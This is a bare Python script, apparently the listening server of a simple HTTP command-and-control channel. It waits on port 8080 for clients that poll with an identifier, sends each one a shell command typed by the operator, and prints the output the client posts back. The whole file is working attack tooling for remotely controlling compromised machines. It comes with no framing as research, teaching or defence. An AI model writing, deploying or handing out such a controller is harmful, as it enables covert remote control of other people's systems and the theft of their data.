from socket import *
import re

# Create socket object and set protocol
s=socket()
s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)

# Bind
s.bind(("0.0.0.0", 8080))

# Listen and set backlog (?)
s.listen(5)

poll_regex = re.compile(b'GET /c\?i=([A-Z0-9\-]+)',re.IGNORECASE)
reply_regex = re.compile(b'POST /r\?i=([A-Z0-9\-]+)',re.IGNORECASE|re.DOTALL)

while True:
        c, addr = s.accept()
        print("Connection from", addr)

        reply = c.recv(4096)

        poll = poll_regex.search(reply)
        reply = reply_regex.search(reply)
        response = bytes('HTTP/1.1 204 OK\r\n\r\n','utf-8')

        if poll:
           command = input("{} > ".format(poll.group(1).decode('utf-8')))
           contentlength = len(command)
           response = bytes('HTTP/1.1 200 OK\r\nContent-length: {}\r\nContent-type: text/plain\r\nConnection: close\r\n\r\n{}'.format(contentlength,command),'utf-8')
        elif reply:
           print("Reply received from {}:\n------\n".format(reply.group(1).decode('utf-8')))
           c.send(bytes('HTTP/1.1 100 Continue\r\n\r\n','utf-8'))
           reply = c.recv(4096)
           print(reply.decode('utf-8'))
           
        c.send(response)
        c.close()
